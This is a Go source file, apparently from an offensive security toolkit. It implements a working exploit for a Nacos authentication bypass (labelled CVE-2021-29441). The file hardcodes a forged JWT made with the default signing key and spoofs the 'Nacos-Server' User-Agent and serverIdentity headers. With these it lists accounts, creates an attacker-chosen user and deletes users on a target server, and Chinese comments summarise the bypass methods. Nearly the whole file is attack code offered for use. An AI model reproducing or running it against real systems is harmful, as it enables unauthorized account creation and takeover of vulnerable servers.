package nacos

import (
	"fmt"
	"net/http"
	"slack-wails/lib/clients"
	"strings"
)

const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g"
const cve_2021_29411_validateURI = "/v1/auth/users?accessToken=" + token + "&pageNo=1&pageSize=9"
const cve_2021_29411_userURI = "/v1/auth/users"

// url 必须输入Nacos页面路径 例如 http://xxx/nacos
// 任意用户添加
// UA绕过 ser-Agent: Nacos-Server
// JWT默认key绕过
// serverIdentity头绕过 Nacos <= 2.2.0
func CVE_2021_29441_Step1(url, username, password string, client *http.Client) bool {
	header := http.Header{}
	header.Add("User-Agent", "Nacos-Server")
	header.Add("accessToken", token)
	header.Add("serverIdentity", "security")
	_, body, err := clients.NewRequest("GET", url+cve_2021_29411_validateURI, header, nil, 10, false, client)
	if err != nil || !(strings.Contains(string(body), "username") && strings.Contains(string(body), "password")) {
		return false
	}
	header.Add("Content-Type", "application/x-www-form-urlencoded")
	content := fmt.Sprintf("username=%s&password=%s", username, password)
	_, body, err = clients.NewRequest("POST", url+cve_2021_29411_userURI, header, strings.NewReader(content), 10, false, client)
	if err != nil {
		return false
	}
	if strings.Contains(string(body), "create user ok") {
		return true
	}
	return false
}

// 删除用户
func CVE_2021_29411_Step2(url, username string, client *http.Client) bool {
	header := http.Header{}
	header.Add("User-Agent", "Nacos-Server")
	header.Add("accessToken", token)
	header.Add("serverIdentity", "security")
	_, body, err := clients.NewRequest("DELETE", url+cve_2021_29411_userURI+"?username="+username, header, nil, 10, false, client)
	if err != nil {
		return false
	}
	if strings.Contains(string(body), "delete user ok") {
		return true
	}
	return false
}
